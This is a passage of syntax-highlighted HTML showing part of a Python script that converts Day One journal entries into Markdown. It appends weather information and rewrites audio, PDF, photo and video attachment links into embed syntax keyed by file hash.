style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\telif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weatherCode&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryWeather &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryWeather &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; • &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weatherCode&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryMedia &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;audios&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; audioFile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;audios&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryMedia&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![](dayone-moment:/audio/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; audioFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;identifier&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; audioFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;md5&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; audioFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;pdfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; pdfFile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;pdfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryMedia&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![](dayone-moment:/pdfAttachment/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; pdfFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;identifier&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; pdfFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;md5&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.pdf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;photos&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; imageFile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;photos&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryMedia&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![](dayone-moment://&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; imageFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;identifier&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; imageFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;md5&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; imageFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;videos&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; videoFile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;videos&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryMedia&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![](dayone-moment:/video/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; videoFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;identifier&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;![[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; videoFile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;md5&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; videoFile&lt;/span&gt;&lt;span 